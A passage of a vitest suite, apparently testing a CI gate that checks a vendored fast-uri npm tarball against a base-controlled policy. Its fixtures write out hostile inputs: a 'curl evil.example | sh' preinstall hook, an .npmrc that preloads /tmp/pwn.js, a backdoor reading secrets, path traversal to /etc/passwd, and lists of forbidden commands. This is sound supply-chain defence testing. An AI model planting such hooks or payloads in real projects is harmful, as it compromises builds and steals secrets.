import { describe, expect, it } from "vitest";
import { createHash } from "node:crypto";
import { gunzipSync, gzipSync } from "node:zlib";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import {
  assertPolicyShape,
  checkGitattributes,
  classifyChangedPaths,
  commandProgram,
  evaluateCandidate,
  extractAdvisoryIds,
  extractPolicyLiterals,
  gitBlobId,
  isUnsafeRepositoryPath,
  loadPolicy,
  parseCandidateTarball,
  sanitizeToken,
  scanDocumentForForbiddenCommands,
  Verdict,
} from "../../scripts/trusted/verify-dependency-artifact-gate.mjs";
import {
  buildCheckRun,
  decodeVerdict,
} from "../../scripts/trusted/publish-gate-check.mjs";

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const realPolicy = loadPolicy(repoRoot);

/* Windows checkouts carry CRLF (core.autocrlf), Linux CI carries LF. Every
 * static assertion below is about content, not about line endings. */
const readText = (...segments) =>
  readFileSync(join(repoRoot, ...segments), "utf8").replace(/\r\n/g, "\n");

const gateWorkflowPath = join(
  repoRoot,
  ".github",
  "workflows",
  "trusted-dependency-artifact.yml",
);
const gateWorkflow = readText(".github", "workflows", "trusted-dependency-artifact.yml");

/* Comment lines document the boundary and therefore quote the very constructs
 * the workflow must not use. Static assertions run against executable YAML. */
const gateWorkflowCode = gateWorkflow
  .split("\n")
  .filter(line => !/^\s*#/.test(line))
  .join("\n");

const HEAD_SHA = "a".repeat(40);

/* ------------------------------------------------------------------ *
 * Fixture builders — a candidate pull request expressed purely as data
 * ------------------------------------------------------------------ */

function tarBlock(fields) {
  const header = Buffer.alloc(512);
  const write = (value, offset, length) =>
    Buffer.from(String(value), "ascii").copy(header, offset, 0, Math.min(String(value).length, length));
  const octal = (value, offset, length) =>
    write(value.toString(8).padStart(length - 1, "0"), offset, length);

  write(fields.name, 0, 100);
  octal(fields.mode ?? 0o644, 100, 8);
  octal(fields.uid ?? 0, 108, 8);
  octal(fields.gid ?? 0, 116, 8);
  octal(fields.size ?? 0, 124, 12);
  octal(fields.mtime ?? 499162500, 136, 12);
  header[156] = (fields.typeflag ?? "0").charCodeAt(0);
  if (fields.linkname) write(fields.linkname, 157, 100);
  write("ustar\u000000", 257, 8);

  header.fill(0x20, 148, 156);
  let checksum = 0;
  for (const byte of header) checksum += byte;
  write(`${checksum.toString(8).padStart(6, "0")}\u0000 `, 148, 8);
  return header;
}

function buildTarball(entries) {
  const blocks = [];
  for (const entry of entries) {
    const body = Buffer.from(entry.body ?? "", "utf8");
    blocks.push(tarBlock({ ...entry, size: body.length }));
    if (body.length > 0) {
      const padded = Buffer.alloc(Math.ceil(body.length / 512) * 512);
      body.copy(padded);
      blocks.push(padded);
    }
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks), { level: 9 });
}

const PACKED_MANIFEST = JSON.stringify({
  name: "fast-uri",
  version: "3.1.7",
  license: "BSD-3-Clause",
  main: "index.js",
});

function goodTarEntries() {
  return [
    { name: "package/package.json", body: PACKED_MANIFEST },
    { name: "package/index.js", body: "module.exports = {};\n" },
    { name: "package/LICENSE", body: "BSD-3-Clause\n" },
  ];
}

function sha256(bytes) {
  // Computed locally so fixtures never take their notion of truth from the
  // module under test.
  return createHash("sha256").update(bytes).digest("hex");
}

const utf8 = value => (Buffer.isBuffer(value) ? value : Buffer.from(String(value), "utf8"));

function buildProvenance() {
  return JSON.stringify({
    files: goodTarEntries().map(entry => ({
      path: entry.name.replace("package/", ""),
      size: Buffer.from(entry.body, "utf8").length,
      mode: 0o644,
      sha256: sha256(Buffer.from(entry.body, "utf8")),
    })),
  });
}

/*
 * The reviewed, well-formed candidate. Every test starts from this and then
 * tampers with exactly one thing, which is what makes each failure attributable.
 */
function baselineFiles(tarball) {
  return {
    "package.json": JSON.stringify(PACKAGE_JSON),
    "package-lock.json": JSON.stringify(PACKAGE_LOCK),
    ".gitattributes": GITATTRIBUTES,
    "SECURITY.md": "# Security\n",
    "vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz": tarball,
    "vendor/npm/fast-uri/3.1.7/provenance.json": buildProvenance(),
    "vendor/npm/fast-uri/3.1.7/README.md": SAFE_README,
    "scripts/verify-fast-uri-artifact.mjs": VERIFIER_SOURCE,
    "scripts/verify-fast-uri-bootstrap.mjs": "// bootstrap\n",
    // Candidate-controlled files the gate must never consult.
    ".github/workflows/sri-check.yml": "name: sri-check\n",
    "tests/spa/fast-uri-artifact-race.test.mjs": "// tests\n",
  };
}

/*
 * A policy clone whose pins describe the synthetic baseline instead of the real
 * 43,760-byte artifact. This is the base-controlled side of the boundary: tests
 * tamper with the *candidate*, never with this. The real committed policy's own
 * values are asserted separately.
 */
function policyFor(tarball, pinOverrides = {}) {
  const policy = structuredClone(realPolicy);
  const baseline = { ...baselineFiles(tarball), ...pinOverrides };
  policy.package.tar.size = tarball.length;
  policy.package.tar.sha256 = sha256(tarball);
  policy.package.tar.sha512 = createHash("sha512").update(tarball).digest("hex");
  policy.package.tar.fileCount = goodTarEntries().length;
  for (const path of Object.keys(policy.digestPins)) {
    const bytes = utf8(baseline[path]);
    policy.digestPins[path] = { sha256: sha256(bytes), size: bytes.length };
  }
  return policy;
}

const VERIFIER_SOURCE = `
export const FAST_URI_POLICY = Object.freeze({
  packageName: "fast-uri",
  version: "3.1.7",
  license: "BSD-3-Clause",
  upstreamCommit: "412e40abd4eb8beabfb952d80abf949a2baf27a3",
  upstreamTree: "a1ec2b29b5d2493a9ba4d2de480a062b08f72558",
  upstreamTrackedFileCount: 46,
  artifactFileCount: 44,
  canonicalTarMtime: 499162500,
  artifactRelativePath: "vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
  provenanceRelativePath: "vendor/npm/fast-uri/3.1.7/provenance.json",
  packageSpec: "file:vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
  overrideSpec: "$fast-uri",
  lockPackagePath: "node_modules/fast-uri",
  sha256: "3fa380284be4ecbf471c1dbb8c5da6f517c95f54279f88c2037985d03fdc6d92",
  sha512: "74ebd95738dd65dcfba6177dbfa8c26f0c6b056ddf2ba9fc45cd02b5d98ce1bba6ccc9f1cb005886ea61e89f35f51470fe4bbeacb6de9707ccba792dbb35551e",
  integrity: "sha512-dOvZVzjdZdz7phd9v6jCbwxrBW3fK6n8Rc0CtdmM4bumzMnxywBYhuph6J819RRw/ku+rLbelwfMunktuzVVHg==",
  artifactSize: 43760,
  artifactUnpackedSize: 218619,
  provenanceSha256: "bfaada6d35b9b09bdbd28b0dd0575ded1515c2f3a232ceccc17389548123eba8",
});
export const REGRESSIONS = [
${realPolicy.verifierPolicyLiterals.requiredAdvisories
  .map(id => `  { advisory: "${id}", verify() {} },`)
  .join("\n")}
];
`;

const PACKAGE_JSON = {
  name: "fsi-agentgov-spa-tests",
  private: true,
  scripts: { test: "vitest run", "verify:sri": "node scripts/verify-sheetjs-sri.mjs" },
  overrides: { ajv: { "fast-uri": "$fast-uri" } },
  devDependencies: {
    ajv: "8.20.0",
    "fast-uri": "file:vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
    vitest: "4.1.11",
  },
};

const PACKAGE_LOCK = {
  name: "fsi-agentgov-spa-tests",
  packages: {
    "": { devDependencies: { ajv: "8.20.0" } },
    "node_modules/ajv": { version: "8.20.0", dev: true, dependencies: { "fast-uri": "^3.0.1" } },
    "node_modules/fast-uri": {
      version: "3.1.7",
      resolved: "file:vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
      integrity:
        "sha512-dOvZVzjdZdz7phd9v6jCbwxrBW3fK6n8Rc0CtdmM4bumzMnxywBYhuph6J819RRw/ku+rLbelwfMunktuzVVHg==",
      dev: true,
    },
    "node_modules/vitest": { version: "4.1.11", dev: true, bin: { vitest: "vitest.mjs" } },
  },
};

const GITATTRIBUTES = "vendor/npm/**/*.tgz binary\nvendor/npm/**/*.json text eol=lf\n";
const SAFE_README = [
  "# Reviewed artifact",
  "",
  "Run the trusted procedure:",
  "",
  "```bash",
  '"$OCEAN_TRUSTED_NODE" "$OCEAN_TRUSTED_NPM_CLI" ci --ignore-scripts --no-bin-links',
  '"$OCEAN_TRUSTED_NODE" scripts/verify-fast-uri-artifact.mjs',
  "```",
  "",
  "Do not run `npm ci` before trust is established.",
  "",
].join("\n");

/*
 * A whole candidate pull request, as the gate sees it: a tree listing plus
 * content-addressed blobs. `reads` records every blob the gate actually
 * fetched, which is how the tests prove candidate workflows and tests are
 * never consulted.
 */
function candidate({ tarball, files = {}, modes = {}, extraPaths = [] } = {}) {
  const blobs = new Map(
    Object.entries({ ...baselineFiles(tarball), ...files }).map(([path, value]) => [
      path,
      utf8(value),
    ]),
  );
  for (const path of extraPaths) {
    if (!blobs.has(path)) blobs.set(path, Buffer.from("x", "utf8"));
  }

  const bySha = new Map();
  const treeEntries = [...blobs.entries()].map(([path, bytes]) => {
    const sha = gitBlobId(bytes);
    bySha.set(sha, bytes);
    return {
      path,
      mode: modes[path] ?? "100644",
      type: modes[path] === "160000" ? "commit" : "blob",
      sha,
      size: bytes.length,
    };
  });

  const reads = [];
  return {
    treeEntries,
    reads,
    readBlob: async (sha, path) => {
      reads.push(path);
      if (!bySha.has(sha)) throw new Error("unknown blob");
      return bySha.get(sha);
    },
  };
}

async function judge({ policy, tree, changedPaths, artifactRequired = true, ...rest }) {
  return evaluateCandidate({
    policy,
    baseRef: "main",
    defaultBranch: "main",
    eventHeadSha: HEAD_SHA,
    currentHeadSha: HEAD_SHA,
    changedPaths,
    treeEntries: tree.treeEntries,
    artifactRequired,
    readBlob: tree.readBlob,
    ...rest,
  });
}

const GUARDED_CHANGE = [
  "package.json",
  "package-lock.json",
  "vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
  "scripts/verify-fast-uri-artifact.mjs",
];

/* ------------------------------------------------------------------ *
 * 1. The base-controlled decision is unaffected by candidate self-attestation
 * ------------------------------------------------------------------ */

describe("authoritative gate — candidate self-attestation is worthless", () => {
  it("accepts a candidate that matches base policy exactly", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "artifact" });
  });

  it("rejects a coherent malicious change that rewrites verifier, hashes, workflow and tests together", async () => {
    const evilTarball = buildTarball([
      ...goodTarEntries(),
      { name: "package/backdoor.js", body: "process.env.SECRET;\n" },
    ]);
    const evilVerifier = VERIFIER_SOURCE.replace(
      "3fa380284be4ecbf471c1dbb8c5da6f517c95f54279f88c2037985d03fdc6d92",
      sha256(evilTarball),
    );
    const tree = candidate({
      tarball: evilTarball,
      files: {
        "scripts/verify-fast-uri-artifact.mjs": evilVerifier,
        // A workflow that claims everything is fine.
        ".github/workflows/sri-check.yml": "name: sri-check\njobs:\n  sri-check:\n    steps:\n      - run: exit 0\n",
        "tests/spa/fast-uri-artifact-race.test.mjs": "// deleted assertions\n",
      },
    });

    // Base policy still describes the *reviewed* artifact, not the candidate's.
    const verdict = await judge({
      policy: policyFor(buildTarball(goodTarEntries())),
      tree,
      changedPaths: [...GUARDED_CHANGE, ".github/workflows/sri-check.yml"],
    });

    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/does not match base policy/);
    // The gate never even read the candidate's workflow or tests.
    expect(tree.reads).not.toContain(".github/workflows/sri-check.yml");
    expect(tree.reads).not.toContain("tests/spa/fast-uri-artifact-race.test.mjs");
  });

  it("rejects a candidate that edits the expected pins inside its own verifier", async () => {
    const tarball = buildTarball(goodTarEntries());
    // Keep the file digest legal by re-pinning it, so only the literals differ.
    // This is the strongest form of the attack: the candidate's own constants
    // are internally consistent and only base policy contradicts them.
    const tampered = VERIFIER_SOURCE.replace('version: "3.1.7"', 'version: "3.1.7-evil"');
    const verdict = await judge({
      policy: policyFor(tarball, { "scripts/verify-fast-uri-artifact.mjs": tampered }),
      tree: candidate({ tarball, files: { "scripts/verify-fast-uri-artifact.mjs": tampered } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/FAST_URI_POLICY\.version does not match/);
  });

  it("rejects a candidate that drops a reviewed security regression", async () => {
    const tarball = buildTarball(goodTarEntries());
    const stripped = VERIFIER_SOURCE.replace(
      'advisory: "GHSA-58mr-gqgx-xq4g"',
      'advisory: "GHSA-0000-0000-0000"',
    );
    const verdict = await judge({
      policy: policyFor(tarball, { "scripts/verify-fast-uri-artifact.mjs": stripped }),
      tree: candidate({ tarball, files: { "scripts/verify-fast-uri-artifact.mjs": stripped } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/no longer covers GHSA-58mr-gqgx-xq4g/);
  });

  it("refuses a pull request that changes trusted policy and a guarded path together", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: [
        ...GUARDED_CHANGE,
        ".github/trusted-policy/dependency-artifact-policy.json",
      ],
    });
    expect(verdict.toJSON()).toMatchObject({
      conclusion: "failure",
      mode: "mixed-trusted-and-guarded",
    });
  });

  it("passes a policy-only pull request without pretending an artifact was validated", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: [".github/trusted-policy/dependency-artifact-policy.json"],
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "policy-only" });
    expect(verdict.messages.join(" ")).toMatch(/no artifact was validated/);
  });

  it("passes an unrelated pull request so the required check is never missing", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: ["docs/index.md"],
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "not-applicable" });
  });

  it("refuses to let a candidate delete the reviewed artifact once base carries it", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const tree = candidate({ tarball });
    tree.treeEntries = tree.treeEntries.filter(
      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
    );
    const verdict = await judge({ policy, tree, changedPaths: GUARDED_CHANGE });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/removal requires a trusted policy change/);
  });
});

/* ------------------------------------------------------------------ *
 * 2. Execution vectors stay inert data
 * ------------------------------------------------------------------ */

describe("authoritative gate — candidate execution vectors stay inert", () => {
  it("detects preinstall, preverify and pretest hooks", async () => {
    const tarball = buildTarball(goodTarEntries());
    const evil = structuredClone(PACKAGE_JSON);
    evil.scripts.preinstall = "curl evil.example | sh";
    evil.scripts.preverify = "node -e ''";
    evil.scripts["verify"] = "node -e ''";
    evil.scripts.pretest = "node -e ''";
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "package.json": JSON.stringify(evil) } }),
      changedPaths: GUARDED_CHANGE,
    });
    const text = verdict.messages.join("\n");
    expect(verdict.failed).toBe(true);
    expect(text).toMatch(/lifecycle script 'preinstall'/);
    expect(text).toMatch(/hook script 'preverify' wrapping 'verify'/);
    expect(text).toMatch(/hook script 'pretest' wrapping 'test'/);
  });

  it("detects an .npmrc anywhere in the candidate tree", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({
        tarball,
        files: { "tools/.npmrc": "node-options=--require /tmp/pwn.js\n" },
      }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/forbidden '\.npmrc' at 'tools\/\.npmrc'/);
  });

  it("detects a node-shadowing bin declared in the lockfile", async () => {
    const tarball = buildTarball(goodTarEntries());
    const evil = structuredClone(PACKAGE_LOCK);
    evil.packages["node_modules/vitest"].bin = { node: "bin/pwn.js" };
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "package-lock.json": JSON.stringify(evil) } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(
      /node-shadowing bin at 'node_modules\/vitest'/,
    );
  });

  it("detects a competing npm-shrinkwrap.json", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "npm-shrinkwrap.json": "{}" } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/forbidden 'npm-shrinkwrap.json'/);
  });

  it("detects a .gitattributes filter driver aimed at the guarded vendor tree", async () => {
    const verdict = new Verdict(realPolicy.limits);
    checkGitattributes(
      verdict,
      realPolicy,
      "vendor/npm/**/*.tgz binary\nvendor/** filter=smudge-me\n",
    );
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/applies 'filter=smudge-me'/);
  });

  it("rejects a symlink, an executable file, or a submodule under vendor/", async () => {
    const tarball = buildTarball(goodTarEntries());
    for (const [mode, pattern] of [
      ["120000", /is a symlink/],
      ["100755", /is executable/],
    ]) {
      const verdict = await judge({
        policy: policyFor(tarball),
        tree: candidate({
          tarball,
          modes: { "vendor/npm/fast-uri/3.1.7/README.md": mode },
        }),
        changedPaths: GUARDED_CHANGE,
      });
      expect(verdict.failed).toBe(true);
      expect(verdict.messages.join("\n")).toMatch(pattern);
    }

    const submodule = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, modes: { "vendor/npm/fast-uri/3.1.7/README.md": "160000" } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(submodule.messages.join("\n")).toMatch(/submodule/);
  });

  it("rejects an unreviewed extra file smuggled into vendor/", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({
        tarball,
        files: { "vendor/npm/fast-uri/3.1.7/postinstall.js": "//\n" },
      }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/outside the reviewed allowlist/);
  });
});

/* ------------------------------------------------------------------ *
 * 3. Archive and manifest structures fail closed
 * ------------------------------------------------------------------ */

describe("authoritative gate — archive and manifest structures fail closed", () => {
  const cases = [
    {
      name: "path traversal",
      entries: [{ name: "package/../../etc/passwd", body: "x" }],
      pattern: /unsafe path|escapes the package root/,
    },
    {
      name: "absolute path",
      entries: [{ name: "/etc/passwd", body: "x" }],
      pattern: /escapes the package root/,
    },
    {
      name: "symlink entry",
      entries: [{ name: "package/link", body: "", typeflag: "2", linkname: "/etc/passwd" }],
      pattern: /not a regular file|link target/,
    },
    {
      name: "hardlink entry",
      entries: [{ name: "package/link", body: "", typeflag: "1", linkname: "package/index.js" }],
      pattern: /not a regular file/,
    },
    {
      name: "executable mode",
      entries: [{ name: "package/index.js", body: "x", mode: 0o755 }],
      pattern: /executable mode/,
    },
    {
      name: "non-canonical mtime",
      entries: [{ name: "package/index.js", body: "x", mtime: 1_700_000_000 }],
      pattern: /non-canonical mtime/,
    },
    {
      name: "non-canonical ownership",
      entries: [{ name: "package/index.js", body: "x", uid: 501 }],
      pattern: /non-canonical ownership/,
    },
  ];

  for (const { name, entries, pattern } of cases) {
    it(`rejects a tarball with ${name}`, () => {
      const tarball = buildTarball(entries);
      expect(() => parseCandidateTarball(tarball, policyFor(tarball))).toThrow(pattern);
    });
  }

  it("rejects an oversize tarball before decompressing it", () => {
    const entries = [{ name: "package/big.js", body: "a".repeat(300_000) }];
    const tarball = buildTarball(entries);
    const policy = policyFor(tarball);
    policy.limits = { ...policy.limits, maxUnpackedBytes: 4096 };
    expect(() => parseCandidateTarball(tarball, policy)).toThrow();
  });

  it("rejects a tarball whose entry count exceeds the bound", () => {
    const entries = Array.from({ length: 12 }, (_, index) => ({
      name: `package/f${index}.js`,
      body: "x",
    }));
    const tarball = buildTarball(entries);
    const policy = policyFor(tarball);
    policy.limits = { ...policy.limits, maxTarEntries: 4 };
    expect(() => parseCandidateTarball(tarball, policy)).toThrow(/exceeds 4 entries/);
  });

  it("rejects a tarball whose size disagrees with the pinned size", () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    policy.package.tar.size = tarball.length + 1;
    expect(() => parseCandidateTarball(tarball, policy)).toThrow(/expected/);
  });

  it("rejects a tarball with trailing data after the terminator", () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const inflated = Buffer.concat([
      Buffer.from(gunzipSync(tarball)),
      Buffer.from("trailing".padEnd(512, "\u0000"), "utf8"),
    ]);
    const repacked = gzipSync(inflated, { level: 9 });
    policy.package.tar.size = repacked.length;
    expect(() => parseCandidateTarball(repacked, policy)).toThrow(/after its zero-block/);
  });

  it("rejects malformed JSON in the lock, the manifest and the provenance", async () => {
    const tarball = buildTarball(goodTarEntries());
    const broken = "{ not json";
    for (const path of [
      "package.json",
      "package-lock.json",
      "vendor/npm/fast-uri/3.1.7/provenance.json",
    ]) {
      const verdict = await judge({
        policy: policyFor(tarball, { [path]: broken }),
        tree: candidate({ tarball, files: { [path]: broken } }),
        changedPaths: GUARDED_CHANGE,
      });
      expect(verdict.failed, path).toBe(true);
      expect(verdict.messages.join("\n"), path).toMatch(/rejected/);
    }
  });

  it("rejects a provenance manifest that disagrees with the packed bytes", async () => {
    const tarball = buildTarball(goodTarEntries());
    const lying = JSON.stringify({
      files: goodTarEntries().map(entry => ({
        path: entry.name.replace("package/", ""),
        size: entry.body.length,
        mode: 0o644,
        sha256: "0".repeat(64),
      })),
    });
    const path = "vendor/npm/fast-uri/3.1.7/provenance.json";
    const verdict = await judge({
      policy: policyFor(tarball, { [path]: lying }),
      tree: candidate({ tarball, files: { [path]: lying } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/does not match its provenance digest/);
  });

  it("rejects a lock that promotes the artifact out of development scope", async () => {
    const tarball = buildTarball(goodTarEntries());
    const evil = structuredClone(PACKAGE_LOCK);
    evil.packages["node_modules/fast-uri"].dev = false;
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "package-lock.json": JSON.stringify(evil) } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/not marked development-only/);
  });

  it("rejects a manifest that promotes the artifact to a production dependency", async () => {
    const tarball = buildTarball(goodTarEntries());
    const evil = structuredClone(PACKAGE_JSON);
    evil.dependencies = { "fast-uri": "file:vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz" };
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "package.json": JSON.stringify(evil) } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/production dependency/);
  });

  it("rejects a blob whose bytes do not match its advertised Git object id", async () => {
    const tarball = buildTarball(goodTarEntries());
    const tree = candidate({ tarball });
    const original = tree.readBlob;
    tree.readBlob = async (sha, path) =>
      path === "package.json" ? Buffer.from("{}", "utf8") : original(sha, path);
    const verdict = await judge({
      policy: policyFor(tarball),
      tree,
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/did not match its Git object id/);
  });
});

/* ------------------------------------------------------------------ *
 * 4. Event, race and bound semantics
 * ------------------------------------------------------------------ */

describe("authoritative gate — event, race and bound semantics", () => {
  it("fails closed when the pull request head moves during validation", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      currentHeadSha: "b".repeat(40),
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/head moved during validation/);
  });

  it("rejects a head SHA that is not a full object id", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      eventHeadSha: "abc123",
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "failure", mode: "invalid-event" });
  });

  it("refuses to judge a pull request aimed anywhere but the default branch", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      baseRef: "release/1.x",
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "failure", mode: "invalid-base" });
  });

  it("refuses to judge a truncated changed-file or tree listing", async () => {
    const tarball = buildTarball(goodTarEntries());
    const truncatedFiles = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      changedPathsTruncated: true,
    });
    expect(truncatedFiles.toJSON()).toMatchObject({ mode: "unbounded-change" });

    const truncatedTree = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      treeTruncated: true,
    });
    expect(truncatedTree.failed).toBe(true);
    expect(truncatedTree.messages.join("\n")).toMatch(/tree listing was truncated/);
  });

  it("rejects unsafe changed paths outright", async () => {
    const tarball = buildTarball(goodTarEntries());
    for (const path of ["../escape.txt", "/etc/passwd", "a\\b.txt", "x\u0000y"]) {
      expect(isUnsafeRepositoryPath(path), path).toBe(true);
    }
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: [...GUARDED_CHANGE, "../escape.txt"],
    });
    expect(verdict.toJSON()).toMatchObject({ mode: "unsafe-path", conclusion: "failure" });
  });

  it("fails closed when metadata references the artifact before its bytes exist", async () => {
    const tarball = buildTarball(goodTarEntries());
    const tree = candidate({ tarball });
    tree.treeEntries = tree.treeEntries.filter(
      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
    );
    const verdict = await judge({
      policy: policyFor(tarball),
      tree,
      changedPaths: ["package.json"],
      artifactRequired: false,
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "failure", mode: "guard-only" });
    expect(verdict.messages.join("\n")).toMatch(/artifact bytes are absent/);
  });

  it("still enforces guard invariants before the artifact lands in base", async () => {
    const tarball = buildTarball(goodTarEntries());
    const tree = candidate({ tarball, files: { "tools/.npmrc": "node-options=--require x\n" } });
    tree.treeEntries = tree.treeEntries.filter(
      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
    );
    const clean = structuredClone(PACKAGE_JSON);
    delete clean.devDependencies["fast-uri"];
    const cleanLock = structuredClone(PACKAGE_LOCK);
    delete cleanLock.packages["node_modules/fast-uri"];
    const rebuilt = candidate({
      tarball,
      files: {
        "tools/.npmrc": "node-options=--require x\n",
        "package.json": JSON.stringify(clean),
        "package-lock.json": JSON.stringify(cleanLock),
      },
    });
    rebuilt.treeEntries = rebuilt.treeEntries.filter(
      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
    );
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: rebuilt,
      changedPaths: ["package.json"],
      artifactRequired: false,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/forbidden '\.npmrc'/);
  });
});

/* ------------------------------------------------------------------ *
 * 5. Documentation scanner (HIGH findings 1 and 2, enforced from base)
 * ------------------------------------------------------------------ */

describe("authoritative gate — documented procedure scanner", () => {
  const flagged = markdown =>
    scanDocumentForForbiddenCommands(realPolicy, markdown, "doc.md");

  it("is not vacuous: it flags the exact instructions the review rejected", () => {
    const unsafe = [
      "```powershell",
      "npm ci",
      "npm run verify:dependency-artifacts",
      "npm test",
      "```",
    ].join("\n");
    const errors = flagged(unsafe);
    expect(errors).toHaveLength(3);
    expect(errors.join("\n")).toMatch(/runs 'npm' before trust is established/);
  });

  it("flags npx, yarn, pnpm and node_modules/.bin shims", () => {
    for (const command of [
      "npx vitest run",
      "yarn install",
      "pnpm install",
      "node_modules/.bin/vitest run",
    ]) {
      expect(flagged(["```bash", command, "```"].join("\n")).length).toBeGreaterThan(0);
    }
  });

  it("sees through prompts, environment prefixes and chained commands", () => {
    expect(flagged(["```bash", "$ FOO=bar npm ci", "```"].join("\n")).length).toBe(1);
    expect(flagged(["```bash", "cd repo && npm test", "```"].join("\n")).length).toBe(1);
    expect(flagged(["```bash", 'PS C:\\r> npm run verify:sri', "```"].join("\n")).length).toBe(1);
  });

  it("accepts the trusted direct procedure", () => {
    expect(flagged(SAFE_README)).toEqual([]);
  });

  it("allows prose that explicitly forbids a command", () => {
    expect(flagged("Do not run `npm ci` before the bootstrap gate.")).toEqual([]);
    expect(flagged("Run `npm ci` first.").length).toBe(1);
  });

  it("blocks a candidate README that reintroduces pre-trust commands", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const unsafeReadme = ["# Reviewed", "", "```powershell", "npm ci", "npm test", "```", ""].join("\n");
    const verdict = await judge({
      policy,
      tree: candidate({
        tarball,
        files: { "vendor/npm/fast-uri/3.1.7/README.md": unsafeReadme },
      }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(
      /README\.md:\d+ runs 'npm' before trust is established/,
    );
  });

  it("resolves the program a shell would actually run", () => {
    expect(commandProgram("  npm ci ")).toBe("npm");
    expect(commandProgram('"$OCEAN_TRUSTED_NODE" script.mjs')).toBe("$OCEAN_TRUSTED_NODE");
    expect(commandProgram("# comment")).toBeNull();
